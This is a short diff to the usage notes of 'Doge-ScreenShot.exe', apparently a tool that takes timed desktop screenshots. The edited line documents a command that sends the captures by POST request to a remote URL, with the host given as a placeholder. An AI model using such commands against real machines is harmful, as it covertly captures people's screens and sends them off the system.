@@ -5,7 +5,7 @@ desktop screenshot
 ```
 PS > .\Doge-ScreenShot.exe
 sshot.exe start
-sshot.exe url http://xxxxx
+sshot.exe url http://xxxxx    //send post request to url
 sshot.exe [count] [sleeptime /s]
 
 Decrypt txt:
